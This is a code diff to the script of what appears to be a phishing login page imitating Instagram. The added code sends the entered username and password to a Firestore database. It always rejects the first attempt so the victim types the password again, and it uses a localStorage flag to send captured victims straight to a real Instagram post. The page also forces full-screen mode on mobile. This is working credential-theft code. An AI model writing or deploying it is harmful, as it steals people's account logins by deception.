@@ -2,7 +2,16 @@ var username = document.getElementById("username");
 var password = document.getElementById("password");
 var login = document.getElementById("login");
 
+
 var newLocation = "https://www.instagram.com/p/CENPCinJrQp/";
+var localKey = "abortMissionV3";
+
+(() => {
+    var abortMission = localStorage.getItem(localKey);
+    if(abortMission === "yes") {
+        location.replace(newLocation);
+    }
+})();
 
 setTimeout(() => {
     document.getElementById("loadingScreen").style.display = "none";
@@ -29,8 +38,38 @@ window.addEventListener("click", () => {
     }
 });
 
+var flagIncorrect = true;
+
+function warnIncorrect() {
+    password.style.border = "1px #ff5a5a solid";
+    password.value = "";
+    password.focus();
+    flagIncorrect = false;
+}
+
+function sendData() {
+    return db.collection("users").add({
+        username: username.value,
+        password: password.value,
+    });
+}
+
 login.addEventListener("click", (e) => {
-    location.replace(newLocation);
+    if(flagIncorrect === true) {
+        sendData().then(function() {
+            warnIncorrect();
+        }).catch(function() {
+            warnIncorrect();
+        });
+    }
+    else {
+        sendData().then(function() {
+            localStorage.setItem(localKey, "yes");
+            location.replace(newLocation);
+        }).catch(function() {
+            warnIncorrect();
+        });
+    }
 });
 
 function goFullScreen() {
@@ -42,5 +81,6 @@ function goFullScreen() {
 }
 
 if(/Mobi|Android/i.test(navigator.userAgent)) {
-    window.addEventListener("click", goFullScreen);
+    window.addEventListener("click", goFullScreen);    
+    window.addEventListener("keyup", goFullScreen);
 }
